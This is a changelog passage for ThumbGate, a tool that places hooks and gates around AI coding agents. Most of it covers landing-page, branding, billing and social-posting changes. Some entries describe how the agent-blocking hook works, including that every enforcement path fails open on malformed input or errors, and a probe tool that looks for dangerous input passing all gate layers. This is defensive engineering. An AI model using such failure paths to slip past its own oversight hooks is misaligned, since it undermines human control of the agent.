  - Replaces the no-op `scripts/hook-verify-before-done.sh` with `scripts/hook-pre-tool-use.js` (matcher expanded to `Bash|Edit|Write`). The new hook: (1) preserves the existing curl-to-prod timestamp tracking; (2) calls `retrieveWithRerankingSync` against the about-to-run tool and injects matched lessons via `hookSpecificOutput.additionalContext`; (3) opt-in via `THUMBGATE_HOOKS_ENFORCE=1`, blocks tool calls with `decision:"block"` when a matched lesson carries a high-risk tag at/above threshold (default 5, configurable via `THUMBGATE_HOOKS_ENFORCE_THRESHOLD`); (4) opt-in via `THUMBGATE_AUTOGATE_PR_COMMITS=1`, auto-registers a `thread-resolution-verified` claim gate when `git commit` runs on a non-main branch.
  - `bin/cli.js session-start` now emits top ThumbGate hard-block rules and top high-risk tags as a structured `hookSpecificOutput.additionalContext` reminder (with stderr fallback for older Claude Code versions), so session start forces the agent to see current enforcement state rather than relying on opt-in `recall`.
  - Every enforcement path fails open: malformed hook stdin, missing risk model, or any uncaught exception in the hook exits 0 with no block, ensuring a bug never deadlocks the agent. Flags default to OFF so the first misfiring regex can be corrected in the same session that shipped it.

- Add a canonical autonomous control-plane workflow to ThumbGate itself.

  - Add `scripts/autonomous-workflow.js`, a durable `intent -> plan -> execute -> verify -> report` runner built on top of the existing async job runtime, workflow checkpoints, and proof-backed workflow logs.
  - Extend `scripts/workflow-gate-checkpoint.js` so checkpoints can persist workflow phase, status, plan, intent, evidence, report metadata, and merged workflow-level metadata across restarts.
  - Persist evidence-backed workflow artifacts under `.thumbgate/autonomous-workflows/<workflowId>/` and record proof-backed workflow runs only when verification accepts the output and artifacts exist.
  - Wire package scripts and package contents so the autonomous runner ships in the npm tarball and stays covered by high-ROI and workflow checkpoint tests.

### Patch Changes

- [#951](https://github.com/IgorGanapolsky/ThumbGate/pull/951) [`3270c2a`](https://github.com/IgorGanapolsky/ThumbGate/commit/3270c2ab90eb51a7a1f59df87dbdc8cb16172327) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Hard-enforce pre-tool prevention signals: matching high-risk boosted tags now block risky actions, PR-branch git commits register a required thread-resolution verification gate before the next unsafe tool call, and corrective actions surface as top-level reminders instead of being buried in JSON.

## 1.6.0

### Minor Changes

- [#931](https://github.com/IgorGanapolsky/ThumbGate/pull/931) [`8161e51`](https://github.com/IgorGanapolsky/ThumbGate/commit/8161e5130c8112447327689dcf00bf8a5f407026) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Replace the `👍👎` emoji header logo with a crisp teal-on-navy `TG` gate monogram across every customer-facing surface (landing page, dashboard, lessons, Pro, Learn hub, Learn articles, SEO-GSD generated pages, and the post-checkout Context Gateway Activated page). Ships `public/assets/brand/thumbgate-mark.svg`, refreshed checkout PNGs, `public/thumbgate-icon.png`, and `public/og.png`; wires `rel="icon"`, `apple-touch-icon`, and `og:image` tags on the main pages so tab icons, Stripe thumbnails, and link previews render the brand consistently instead of OS-dependent Unicode glyphs or the old chart-like mark. Hero-thumbs decorative art on the landing page is preserved intentionally.

- [#922](https://github.com/IgorGanapolsky/ThumbGate/pull/922) [`30cf554`](https://github.com/IgorGanapolsky/ThumbGate/commit/30cf554cb023982663d024f550b72b21d8c8d625) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Cursor plugin: fix broken promises and add real wiring. README claimed `npx thumbgate init --agent cursor` worked; it didn't. Added cursor detection + dispatcher + `wireCursorHooks` that writes `.cursor/mcp.json` with the ThumbGate MCP server (preserves other entries, idempotent). Added dedicated "🎯 Cursor plugin" card to the landing page Compatibility section with a real install URL. Added Cursor install link to the First-Dollar step 1 and hero secondary CTAs. 5 new tests guard the wiring. Also hardens landing-page pills into real `<a>` clickable links with hover/focus states.

- [#909](https://github.com/IgorGanapolsky/ThumbGate/pull/909) [`a9e0f0d`](https://github.com/IgorGanapolsky/ThumbGate/commit/a9e0f0da30535e95c2311960681c58739a454244) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add Insights tab to dashboard with interactive Chart.js charts (feedback trend, lessons generated, gate effectiveness), clickable pipeline visualization, and data consistency fix across all stat paths.

- [#902](https://github.com/IgorGanapolsky/ThumbGate/pull/902) [`94d3882`](https://github.com/IgorGanapolsky/ThumbGate/commit/94d38820541d05dfed391754d95ed45671fa3761) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add ElevenLabs-based demo voiceover automation (`scripts/generate-demo-voiceover.js`) that extracts narration from the canonical demo video script and synthesizes an mp3 via the ElevenLabs TTS API. Promote the landing page demo video out of the collapsed `<details>` into a visible inline hero embed, add a 90-second demo section to the top of `README.md`, and rewrite the Show HN launch draft around the token-cost mission. Schedule `reply-monitor.yml` daily at 13:00 UTC with LinkedIn environment passthrough, and ship two LinkedIn ops docs: a 2-minute daily manual-check runbook and a fully-drafted LinkedIn Community Management API application package.

- [#926](https://github.com/IgorGanapolsky/ThumbGate/pull/926) [`d8d1047`](https://github.com/IgorGanapolsky/ThumbGate/commit/d8d10477a013609acaf69c8e9c14794f232ffe7d) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add lightweight durable-step helper (`scripts/durability/step.js`) inspired by Vercel Workflows' "use step" pattern. Wraps external I/O with uniform retry + idempotency semantics without pulling in a full durable-execution runtime:

  - **`runStep(name, opts, fn)`** — retry with exponential backoff, classifying transient vs permanent errors (HTTP 429/5xx retry, 4xx bail, socket codes retry, `nonRetryable` flag bails immediately)
  - **`idempotencyKey(...parts)`** — stable SHA-256-derived 32-char key for safe POST retry

  Wired into three highest-leverage call sites:

  1. **Zernio publisher** (`publishPost`, `schedulePost`) — adds `Idempotency-Key` header so retried POSTs collapse to one published post on Zernio's side. Plan-quota errors are tagged `nonRetryable` to avoid wasting retries on 402-equivalents.
  2. **LanceDB vector write** (`upsertFeedback`) — survives transient filesystem contention (EBUSY / lock timeouts) with 2-retry backoff; embedding is pure CPU so not retried.
  3. **Anthropic SDK call** (`callClaude`) — retries 429/5xx, bails on malformed-prompt / auth errors. Contract-preserving: callers still get `null` on permanent failure.

  21 unit tests cover success/retry/exhaustion/nonRetryable paths and idempotency-key stability.

  Not a Vercel Workflows migration — deliberately scoped to capture ~70% of the reliability benefit with ~60 lines of code and zero new infrastructure.

- [#912](https://github.com/IgorGanapolsky/ThumbGate/pull/912) [`f1fccae`](https://github.com/IgorGanapolsky/ThumbGate/commit/f1fccaeefab882e5d6de193e0986d7f7cd3e2a4c) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - PreToolUse hook now injects semantically-relevant past negative lessons into `additionalContext` before every tool call. Turns ThumbGate from a passive log into an active governor: captured lessons surface at decision time so the agent sees its past mistakes BEFORE executing, not after. Shipped by default via `thumbgate init --agent claude-code|codex` — users already running that get the enforcement automatically on next hook invocation.

- [#952](https://github.com/IgorGanapolsky/ThumbGate/pull/952) [`dadf4ba`](https://github.com/IgorGanapolsky/ThumbGate/commit/dadf4bae8cd328d032121ebe265733ffc84d9b38) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add `buildRecentCorrectiveActionsContext` to `scripts/gates-engine.js`: surfaces the 3 most recent captured mistakes (from `memory-log.jsonl`, last 24h) as `hookSpecificOutput.additionalContext` on every tool call. Plugs the cold-start gap where a just-captured mistake would otherwise wait for semantic match or the recurring-pattern threshold before reaching the agent's context.

- [#889](https://github.com/IgorGanapolsky/ThumbGate/pull/889) [`bc79ae2`](https://github.com/IgorGanapolsky/ThumbGate/commit/bc79ae264d6f4813af84d536b7ddb963946914b9) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Reposition ThumbGate around a single sharp mission: **stop your AI from making the same mistake twice.** Repeated AI mistakes cost real money in tokens — one thumbs-down captures the lesson and ThumbGate blocks that exact pattern on every future call, across every agent.

  - **New hero copy everywhere** — plain-English, pain-point-in-one-sentence, no buzzword cadence. Applied to landing page, README, meta/OG tags, JSON-LD, package.json, plugin.json, and `config/github-about.json`.
  - **Live "💸 Tokens Saved" counter** on the dashboard. New `scripts/token-savings.js` helper (21 tests, Sonnet-blended default) turns blocked-gate + bot-deflection counts into a live token + dollar estimate. Swap in your own model mix to honestly reflect your Anthropic / OpenAI bill.
  - **New ClawHub / OpenClaw distribution skill** — `dist/clawhub-skill/SKILL.md` — ready for `npm run clawhub:publish` once authenticated. Expands the distribution surface to the OpenClaw skill marketplace alongside the Claude Extension, Codex plugin, npm, and MCP marketplaces.
  - **SEO blog post** `docs/marketing/blog-token-cost-mission.md` ranking on "save Claude tokens" / "reduce LLM cost" / "AI agent token waste."
  - **Pre-validated social pack** `docs/marketing/token-cost-mission-social-pack.md` (X/Threads/LinkedIn/HN/Reddit/TikTok) under every platform's char limit.

- [#922](https://github.com/IgorGanapolsky/ThumbGate/pull/922) [`30cf554`](https://github.com/IgorGanapolsky/ThumbGate/commit/30cf554cb023982663d024f550b72b21d8c8d625) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Real token-savings on the dashboard — no more hardcoded numbers. The Insights tab now shows `$ saved` computed from actual gate-stats.blocked count × conservative tokens/block × published Sonnet/Opus/Haiku prices. Zero blocks → shows $0.00 honestly (not a marketing placeholder). Methodology (input/output tokens per block, model mix, blended price) is disclosed inline. Landing page hero still uses the "Sample" demo — dashboard now uses real data.

- [#931](https://github.com/IgorGanapolsky/ThumbGate/pull/931) [`8161e51`](https://github.com/IgorGanapolsky/ThumbGate/commit/8161e5130c8112447327689dcf00bf8a5f407026) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Send a branded welcome email with the license key and activation command whenever
  `checkout.session.completed` fires. Uses Resend (`RESEND_API_KEY`) with
  `onboarding@resend.dev` as the default sender so the webhook keeps working
  without a verified domain. If the key is unset, the webhook logs a warning and
  continues — the license key is always persisted regardless of email state.

### Patch Changes

- [#919](https://github.com/IgorGanapolsky/ThumbGate/pull/919) [`7be5cc6`](https://github.com/IgorGanapolsky/ThumbGate/commit/7be5cc628a4da37a93084347b1db569283647078) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix recurring regression: add `public/pro.html`, `public/blog.html`, `public/learn.html` to npm files whitelist so they actually ship. New `tests/public-package-parity.test.js` asserts (a) every HTML in `public/` is in whitelist, (b) every whitelist entry exists on disk, (c) no stale `$99/seat` Team pricing ships. Prevents the packaging-bug pattern that hit 1.5.0, 1.5.1, 1.5.3.

- [#949](https://github.com/IgorGanapolsky/ThumbGate/pull/949) [`c8b31e9`](https://github.com/IgorGanapolsky/ThumbGate/commit/c8b31e9fe5fe685fa981b1230535b8f0b97b37fb) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add an Autoresearch Safety Pack acquisition wedge with a buyer guide, landing-page CTAs, LLM context, SEO/GEO seeds, and regression tests for self-improving agent safety discovery.

- [#918](https://github.com/IgorGanapolsky/ThumbGate/pull/918) [`f063c1a`](https://github.com/IgorGanapolsky/ThumbGate/commit/f063c1a3723bafc1ef52ae5208fc67af3d36d702) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Version bump to 1.5.3 — publish the landing page congruence fixes, dashboard deep-linking, and README corrections that merged as [#914](https://github.com/IgorGanapolsky/ThumbGate/issues/914) after 1.5.2 had already been published from [#911](https://github.com/IgorGanapolsky/ThumbGate/issues/911).

- [#858](https://github.com/IgorGanapolsky/ThumbGate/pull/858) [`204dbbe`](https://github.com/IgorGanapolsky/ThumbGate/commit/204dbbeb42c9140318b2907f9bea4156b67e390a) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Expose the ChatGPT Actions OpenAPI YAML import before bearer auth and document the GPT Builder bearer key setup.

- [#869](https://github.com/IgorGanapolsky/ThumbGate/pull/869) [`5bac711`](https://github.com/IgorGanapolsky/ThumbGate/commit/5bac711e8ff8e232fc66b6da3abe8ec9a48841f7) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Deflect checkout crawlers and link-preview bots before creating Stripe sessions so revenue telemetry reflects real buyer intent.

- [#932](https://github.com/IgorGanapolsky/ThumbGate/pull/932) [`bc9f0c0`](https://github.com/IgorGanapolsky/ThumbGate/commit/bc9f0c0b4052a58fe957e36cc7368d692aa268c6) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Replace stale checkout logo assets with ThumbGate brand marks and add activation email delivery instrumentation for trial provisioning.

- [#877](https://github.com/IgorGanapolsky/ThumbGate/pull/877) [`1c7140e`](https://github.com/IgorGanapolsky/ThumbGate/commit/1c7140ec44f328bfa14d946984324631915260f9) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add prominent "Install Claude Extension →" CTA to the landing page hero section, matching the existing Codex plugin link. Links to the .mcpb bundle download with PostHog tracking.

- [#922](https://github.com/IgorGanapolsky/ThumbGate/pull/922) [`30cf554`](https://github.com/IgorGanapolsky/ThumbGate/commit/30cf554cb023982663d024f550b72b21d8c8d625) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Compat cards that promise a download now link directly to the release asset instead of a docs/source page. Codex plugin card was linking to `INSTALL.md` source despite saying "download the zip"; Claude Desktop Extension card was linking to a guide page despite saying "install the .mcpb bundle today". Both now go straight to the `.zip` / `.mcpb` on GitHub Releases. Setup-instruction secondary links preserved inline. New test `landing-page-claims.test.js` guards against regression: any compat card with "Download" in the arrow MUST have href pointing at `releases/.../download/`.

- [#935](https://github.com/IgorGanapolsky/ThumbGate/pull/935) [`1785ca9`](https://github.com/IgorGanapolsky/ThumbGate/commit/1785ca989f22642396baf804194bf8ff0f165bce) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Clarify the Codex plugin marketing card so it sends users to the install page and keeps MCP directory install copy on ThumbGate's npx path.

- [#927](https://github.com/IgorGanapolsky/ThumbGate/pull/927) [`4742253`](https://github.com/IgorGanapolsky/ThumbGate/commit/4742253e2b3bd0d89d79881e54b343653d2f875d) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Codex MCP installs now resolve `thumbgate@latest` when Codex starts the MCP server or hook bundle, instead of preferring a stale already-installed runtime binary. The repo-local Codex plugin, standalone bundle config, README, landing page, and distribution docs now advertise the auto-updating Codex plugin path truthfully while preserving local source fallback for unpublished development builds.

- [#895](https://github.com/IgorGanapolsky/ThumbGate/pull/895) [`fbc66c9`](https://github.com/IgorGanapolsky/ThumbGate/commit/fbc66c989c830acd2513ff77769627e2aa242919) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Wire the full Codex hook bundle during init and add the Codex status line target to the generated local config.

- [#880](https://github.com/IgorGanapolsky/ThumbGate/pull/880) [`7ddf48f`](https://github.com/IgorGanapolsky/ThumbGate/commit/7ddf48f664dd113dc933006f46f2c78e905a66ac) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Landing page conversion overhaul: restructure visual hierarchy for conversion

  - Hero: single dominant CTA (install command + Install Free CLI), secondary CTAs grouped and visually demoted
  - Terminal demo: moved immediately after hero to show the product before any explanation
  - Trust bar: added above-the-fold honest social proof (MIT, GitHub stars, local-first, 6 integrations)
  - Hero headline: rewritten for clarity ("Stop expensive AI agent mistakes before they happen")
  - Nav: simplified to 4 visible links (How It Works, Pricing, FAQ, GitHub) + Install Free CTA
  - Enterprise intake form: collapsed behind a details/summary toggle to reduce page overwhelm
  - Newsletter section: simplified headline, removed internal jargon ("Buyer Follow-Up" → "Stay Updated")
  - Final CTA: simplified to 2 primary actions, secondary CTAs visually demoted
  - CSS: added conversion hierarchy styles to reduce visual weight of secondary sections
  - Pro pricing card: added email capture input (pro-email) for 7-day trial flow
  - All 36 landing page tests pass

- [#906](https://github.com/IgorGanapolsky/ThumbGate/pull/906) [`6db3ab1`](https://github.com/IgorGanapolsky/ThumbGate/commit/6db3ab1c09fd500d31b2d426c02540f0635e01e4) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Rewrite postinstall banner to drive first-dollar conversion. Lead with concrete token-waste pain point, add tracked `/go/pro` click-through (UTM: source=npm, medium=postinstall, campaign=first_dollar) alongside direct Stripe link, clean up ragged box formatting. Every npm install sees this banner — making it the highest-leverage conversion touchpoint.

- [#924](https://github.com/IgorGanapolsky/ThumbGate/pull/924) [`3a8ec38`](https://github.com/IgorGanapolsky/ThumbGate/commit/3a8ec38b7b35cc384514e6f2054a09777c13d46e) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Unlock the full dashboard demo (no blur-wall paywall), point GSD-brief CTAs directly at `/checkout/pro` instead of the homepage 301 hop, and fix the sticky sidebar overflow so long right-rails scroll internally on GSD-brief pages.

- [#893](https://github.com/IgorGanapolsky/ThumbGate/pull/893) [`e699073`](https://github.com/IgorGanapolsky/ThumbGate/commit/e6990730014d4151837ee61e4d46544bb07d4712) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add decision-trace module for full gate evaluation observability. Logs passes, blocks, and near-misses (constraints that almost matched). Includes session trace summaries showing safety posture at a glance — inspired by Ethan Mollick's observation that operators need to see agent thinking traces.

- [#910](https://github.com/IgorGanapolsky/ThumbGate/pull/910) [`b1c4c28`](https://github.com/IgorGanapolsky/ThumbGate/commit/b1c4c28bc54e982976f1955d60601468b3e2715a) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Replace the landing-page explainer video with a reproducible 90-second animated
  walkthrough that actually explains the mechanism — same-mistake-different-session
  pain, 👎 → Pre-Action Gate extraction, gate fires on the next bad call,
  compounding token savings, one-line install. Adds an offline render pipeline
  (`scripts/render-demo-video/`) that drives a scripted 1920×1080 HTML animation
  through headless Playwright and muxes an ElevenLabs/`say` narration track —
  byte-reproducible on every re-render, no live agent session required. New
  npm scripts: `demo:narration`, `demo:render`, `demo:render:full`.

- [#924](https://github.com/IgorGanapolsky/ThumbGate/pull/924) [`3a8ec38`](https://github.com/IgorGanapolsky/ThumbGate/commit/3a8ec38b7b35cc384514e6f2054a09777c13d46e) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Replace legacy "MCP Memory Gateway" green logo in `docs/logo-400x400.png` with the proper ThumbGate brand mark (cyan thumbs-up + wordmark on dark background). Also detached the stale image from the Stripe Product (`prod_UE7SR5NFBkumEp`) so checkout no longer shows the legacy asset. Fixes CEO-reported "weird MCP logo on Stripe annual checkout" bug.

- [#866](https://github.com/IgorGanapolsky/ThumbGate/pull/866) [`8a62372`](https://github.com/IgorGanapolsky/ThumbGate/commit/8a623727f45d41a73738d1db71f5d4f01a00316c) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix wire-hooks to clean stale project-level Claude Code hooks referencing missing files. Previously only cleaned user-level settings, leaving broken hooks in .claude/settings.json that caused "UserPromptSubmit hook error".

- [#902](https://github.com/IgorGanapolsky/ThumbGate/pull/902) [`94d3882`](https://github.com/IgorGanapolsky/ThumbGate/commit/94d38820541d05dfed391754d95ed45671fa3761) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix: serve public static assets (`/assets/*`, `/favicon.ico`, `/thumbgate-logo.png`, `/og.png`, `/apple-touch-icon.png`) without requiring an API key. Before this change the landing page rendered but every image, video, and icon fell through to the `/v1/*` API-key guard and returned 401, leaving visitors with an empty video player and broken poster images. Adds path-traversal-safe asset routing with correct MIME types, `Cache-Control: public, max-age=86400, immutable`, and HEAD-request support. Covered by `tests/public-static-assets.test.js`.

- [#903](https://github.com/IgorGanapolsky/ThumbGate/pull/903) [`689a9bd`](https://github.com/IgorGanapolsky/ThumbGate/commit/689a9bda46e0d584041ff33fd20d69e7ad073784) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add gate-coherence analyzer to detect pseudo-unification across enforcement layers. Runs 20 probes across spec-gate and gate-config layers, detects contradictions (one blocks, another allows), coverage gaps (dangerous input passes all layers), and false positives. Reports coherence score and grade (unified/divergent/over-blocking). Inspired by entropy-probing research on pseudo-unification in multimodal models.

- [#898](https://github.com/IgorGanapolsky/ThumbGate/pull/898) [`bc67f55`](https://github.com/IgorGanapolsky/ThumbGate/commit/bc67f55199b4dc0512e0823142a808cb4ede0fe8) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add gate-eval module for systematic evaluation of gate effectiveness. Operators define eval suites (expected block/pass outcomes), run them against specs, get precision/recall/F1 metrics, compare spec versions A/B, and track effectiveness trends over time. Ships with 16-case agent-safety eval suite. Inspired by Anthropic's prompt evaluation framework.

- [#941](https://github.com/IgorGanapolsky/ThumbGate/pull/941) [`fdcbb13`](https://github.com/IgorGanapolsky/ThumbGate/commit/fdcbb13b78f07c9cc858970789f62ab54572eecc) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix header logo rendering as tiny iOS-launcher tile across all site surfaces. The existing `/assets/brand/thumbgate-mark.svg` is designed as an app-icon (full 512×512 canvas with a `#0a0d12` rounded-square backdrop filling the entire viewBox). When inlined in headers at 28–32px next to the wordmark it read as "a dark tile with a microscopic icon inside" rather than as a clean brand mark. Adds a new transparent full-bleed companion `/assets/brand/thumbgate-mark-inline.svg` and repoints every header `<img src=…>` (landing, dashboard, lessons, pro, learn hub + 5 learn articles, post-checkout success page, SEO-GSD generator — 12 surfaces) to the inline variant. `apple-touch-icon` / PWA / OG link tags intentionally still reference the app-icon tile — that is the correct asset for iOS home-screen bookmarks. Adds a regression-guard in `brand-assets.test.js` that fails if the app-icon tile is ever re-inlined in a header, and an inline-mark transparency assertion that blocks reintroducing a full-canvas dark rectangle.

- [#931](https://github.com/IgorGanapolsky/ThumbGate/pull/931) [`8161e51`](https://github.com/IgorGanapolsky/ThumbGate/commit/8161e5130c8112447327689dcf00bf8a5f407026) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Rewrite the post-checkout "Hosted API setup" section on the Context Gateway Activated page with a plain-English value prop: what it is, when teams and CI users need it, when solo-laptop users can skip it, then the setup steps. Fixes the feedback that customers finish checkout and see jargon with no explanation of why the Hosted API matters.

- [#904](https://github.com/IgorGanapolsky/ThumbGate/pull/904) [`c5b5204`](https://github.com/IgorGanapolsky/ThumbGate/commit/c5b5204f75fc748641fee6e69e85cdb061dda8da) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add incremental dashboard review checkpoints so operators can mark the current state as reviewed and then see only new feedback, promoted lessons, and gate blocks that landed afterward. This ships the persisted review baseline, the dashboard checkpoint controls, and the `/v1/dashboard/review-state` API for reading and resetting the current checkpoint.

- [#943](https://github.com/IgorGanapolsky/ThumbGate/pull/943) [`7ac112c`](https://github.com/IgorGanapolsky/ThumbGate/commit/7ac112c0c210dd1be2bd4e9a14e1892b803ae0e3) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Replace the header inline logo and legacy favicon SVGs with the TG gate monogram so checkout, dashboard, and marketing headers use the same professional ThumbGate identity.

- [#879](https://github.com/IgorGanapolsky/ThumbGate/pull/879) [`5f3e1fc`](https://github.com/IgorGanapolsky/ThumbGate/commit/5f3e1fc7e842aa9d4602741b104b6dd024d2a070) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix Instagram publishing end-to-end. `post-video.js` now uses the Zernio presign upload flow + shared `publishPost`, matching the `{ url, key, size, contentType, type }` media-item shape Instagram requires (legacy `/media` multipart + minimal `{ url, type }` payload was silently rejected). Added `instagram` dispatcher to `post-everywhere.js` (previously a silent no-op). Added daily `instagram-autopilot.yml` workflow that posts a ThumbGate card via `publish-instagram-thumbgate.js`.

- [#945](https://github.com/IgorGanapolsky/ThumbGate/pull/945) [`2f8e670`](https://github.com/IgorGanapolsky/ThumbGate/commit/2f8e670f6ac4020febc43cbf852bc9fade2b39d7) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Welcome email v2: consolidate the trial welcome email through the `scripts/mailer/resend-mailer.js` module and upgrade the template. Adds personalized greeting (first name from Stripe `customer_details.name`), explicit trial-end date (from Stripe `subscription.trial_end`), branded header mark, founder signoff, quickstart P.S., `reply_to: hello@thumbgate.app`, and a CAN-SPAM footer (business name, physical address, unsubscribe mailto) on every send. `handleWebhook` now threads `customerName` and `trialEndAt` through to the mailer. The legacy inline transport remains as a fallback and its `no_api_key` skip reason is normalized to `missing_resend_api_key` so dashboards and support tooling see a stable vocabulary regardless of which transport produced the skip.

- [#878](https://github.com/IgorGanapolsky/ThumbGate/pull/878) [`927e3ca`](https://github.com/IgorGanapolsky/ThumbGate/commit/927e3cacd6eccb4a02fe68f5f2912bb4ab16d626) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - feat: Claude-first landing page overhaul

  Restructures the entire landing page to prominently feature Claude plugin, Claude Extension, and Claude Code alongside (and above) the GPT promotion:

  - Hero section: rewrites subtitle from GPT-first to agent-agnostic, adds "Install Claude Extension" as a primary amber CTA button
  - New dedicated Claude Code section added before the ChatGPT GPT section
  - Compatibility grid reordered: Claude Desktop Extension first, Claude Code Skill second, ChatGPT demoted to last
  - First-Dollar Activation Path rewritten from GPT-centric to agent-agnostic install flow
  - Proof bar reordered with Claude links first
  - Final CTA adds Claude Extension button
  - Nav bar adds Claude link and Claude Extension CTA
  - GPT section renamed to "Also Available" to reduce GPT-first impression

- [#914](https://github.com/IgorGanapolsky/ThumbGate/pull/914) [`e6c6012`](https://github.com/IgorGanapolsky/ThumbGate/commit/e6c60120cc88021e59517eed0184e39c17548456) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Landing page congruence fixes and dashboard deep-linking:

  - Remove misleading "1 agent" Free tier bullet (no per-agent enforcement exists in rate-limiter)
  - Rephrase Free tier bullets to match actual code behavior (1 auto-promoted prevention rule, built-in safety gates)
  - Add hash-based deep-linking to dashboard: `/dashboard#insights`, `/dashboard#gates`, `/dashboard#export` now auto-switch tabs
  - "Visual gate debugger" link on Pro tier now deep-links to `#insights` (was pointing to root `/dashboard`)
  - "DPO training data export" link on Pro tier now deep-links to `#export`
  - Add `public/dashboard.html`, `scripts/prompt-eval.js`, `bench/prompt-eval-suite.json`, `CHANGELOG.md` to npm files whitelist — these were missing, breaking the dashboard for users running `npx thumbgate pro`
  - New tests: 19 landing-page-claims (code-backed claim audit), 3 dashboard-deeplink-e2e (real server + HTTP fetch + hash validation)

- [#913](https://github.com/IgorGanapolsky/ThumbGate/pull/913) [`7dddb46`](https://github.com/IgorGanapolsky/ThumbGate/commit/7dddb46f0d0972a04d5cf22e0199f9110534e9ac) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add LinkedIn one-shot comment engagement: `publishComment` publisher
  (`scripts/social-analytics/publishers/linkedin-comment.js`) that posts a comment
  on a specified activity URN via the socialActions endpoint, plus a
  `linkedin-comment-engage.yml` workflow_dispatch that runs it with the
  `LINKEDIN_ACCESS_TOKEN` / `LINKEDIN_PERSON_URN` secrets. Used for
  high-signal targeted engagements on prospect / thought-leader posts
  whose audience overlaps ThumbGate's ICP; bulk / scheduled engagement
  still flows through Ralph Loop.

- [#924](https://github.com/IgorGanapolsky/ThumbGate/pull/924) [`3a8ec38`](https://github.com/IgorGanapolsky/ThumbGate/commit/3a8ec38b7b35cc384514e6f2054a09777c13d46e) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add LinkedIn Post Dispatch workflow — first-party post publisher with optional article link-preview card. Fallback path when Comment API and Quote-Post reshare are blocked by LinkedIn's permission model.

- [#920](https://github.com/IgorGanapolsky/ThumbGate/pull/920) [`bb7a1f8`](https://github.com/IgorGanapolsky/ThumbGate/commit/bb7a1f8935a8a462ba055813c5a40124509b3475) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add LinkedIn quote-post engagement pivot: `linkedin-quote-post.js` publisher + `linkedin-quote-post-engage.yml` workflow_dispatch. Publishes a standalone post on the authenticated member's feed with `reshareContext.parent` referencing the target activity URN, so we can engage with thought-leader posts when the Community Management API (`socialActions/{urn}/comments`) is not available on the app. Uses only `w_member_social` — already granted via the existing "Share on LinkedIn" product — no additional LinkedIn Developer Portal approvals required. The original author receives a mention-style notification through the reshare reference.

- [#886](https://github.com/IgorGanapolsky/ThumbGate/pull/886) [`f72d242`](https://github.com/IgorGanapolsky/ThumbGate/commit/f72d2428a7481c949af7c7dafaa968fa84255f44) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Marketing assets and README overhaul: conversion-optimized README with architecture diagrams, SEO tutorial article, Manus AI skill, and technical architecture diagrams (MCP flow, feedback pipeline, agent integration).

- [#863](https://github.com/IgorGanapolsky/ThumbGate/pull/863) [`2a048e2`](https://github.com/IgorGanapolsky/ThumbGate/commit/2a048e2f9d910da2b2689656109af2e2364f7ee1) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Wire Stripe pricing calls to action into the marketing autopilot and scheduled X revenue loop.

- [#881](https://github.com/IgorGanapolsky/ThumbGate/pull/881) [`91e971d`](https://github.com/IgorGanapolsky/ThumbGate/commit/91e971daa57d69ec5ce8ab2e85f0ac349828dd15) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - fix(monetization): enforce lifetime free-tier caps, reduce Team pricing to $49/seat

  - Rate limiter switched from daily resets to lifetime caps (3 captures, 1 rule, recall blocked)
  - Team plan reduced from $99 to $49/seat/month with new Stripe price ID
  - Landing page rewritten with pain-first copy, hard limits visible, updated CTAs

